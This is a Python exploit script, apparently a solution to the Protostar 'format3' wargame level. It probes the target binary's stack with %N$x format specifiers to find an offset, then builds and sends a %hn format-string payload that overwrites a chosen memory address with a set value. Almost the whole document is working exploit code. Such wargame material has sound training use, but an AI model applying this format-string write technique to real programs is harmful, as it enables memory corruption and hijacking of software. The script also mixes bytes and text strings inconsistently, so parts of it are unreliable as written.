import struct, subprocess

target_addr = 0x080496f4
target_val = 0x01025544
cmd = '/opt/protostar/bin/format3'

def run(args):
        p = subprocess.Popen([cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        p.stdin.write(args)
        p.stdin.close()
        results = p.stdout.read()
        return results

def findPosition(t):
        b = struct.pack("I", target_addr) + struct.pack("I", target_addr + 2)
        for i in range(1, 20):

                result = run(b + b' %' + str(i).encode('utf-8') + b'$x ')
                if (result.split(' ')[-5] == hex(target_addr)[2:10]):
                        print('[+] Found match ' + result.split(' ')[-5] + ' at position ' + str(i))
                        return i

def generateValues(pos):

        #target_high_val, target_low_val = divmod(target_val, 0x1000)
        target_high_val, target_low_val = (0x0102, 0x5544)


        b = struct.pack("I", target_addr + 2) + struct.pack("I", target_addr)

        h = b'%' + str(int(target_high_val) - 8).encode('utf-8') + b'x'
        l = b'%' + str(int(target_low_val) - int(target_high_val)).encode('utf-8') + b'x'
        assert (int(l.decode('utf-8')[1:-1])) == (int(target_low_val) - int(target_high_val)), "Low calcs wrong"

        assert (int(h.decode('utf-8')[1:-1])) == (int(target_high_val) - 8), "High calcs wrong"

        hw = b'%' + str(pos).encode('utf-8') + b'$hn'

        lw = b'%' + str(pos + 1).encode('utf-8') + b'$hn'

        return b, h, hw, l, lw


print('[+] Scanning stack for ' + hex(target_addr)[2:10])
pos = findPosition(target_addr)

print('  [+] Generating payload')
buffer, high_val, high_write, low_val, low_write = generateValues(pos)
p = buffer + high_val + high_write + low_val + low_write + ' '
print('  [+] Sending exploit ' + p)
result = run(p)

print('    [!] ' + ' '.join(result.split(' ')[-6:]))

                                       
